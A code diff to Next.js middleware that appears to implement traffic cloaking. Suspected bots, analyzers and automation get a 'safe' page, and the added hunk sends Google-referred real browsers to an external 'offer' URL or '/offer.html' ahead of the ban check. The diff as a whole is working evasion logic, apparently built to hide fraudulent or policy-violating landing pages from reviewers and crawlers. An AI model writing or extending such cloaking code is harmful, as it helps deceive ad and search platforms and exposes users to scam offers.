@@ -13,6 +13,7 @@ import {
   getASN,
   isAnalyzerRequest,
   isLikelyBrowserAutomation,
+  isTrustedGoogleRef,
 } from './utils/botCheck'
 
 async function logDecision(req: NextRequest, decision: 'offer' | 'safe' | 'challenge' | 'bypass', reasons: string[], score?: number) {
@@ -58,7 +59,17 @@ export async function middleware(req: NextRequest) {
     return NextResponse.next()
   }
 
-  // Hard bans
+  // Allowlist: real browser traffic coming from Google search results
+  if (isTrustedGoogleRef(req)) {
+    await logDecision(req, 'offer', ['allow:google-ref'])
+    const OFFER_URL = process.env.NEXT_PUBLIC_OFFER_URL
+    if (OFFER_URL && /^https?:\/\//i.test(OFFER_URL)) {
+      return NextResponse.redirect(OFFER_URL)
+    }
+    return NextResponse.rewrite(new URL('/offer.html', req.url))
+  }
+
+  // Hard bans (skip for Google-ref allowlisted traffic)
   if (isBanned(req)) {
     await logDecision(req, 'safe', ['cookie:ban'])
     return NextResponse.rewrite(new URL('/safe.html', req.url))
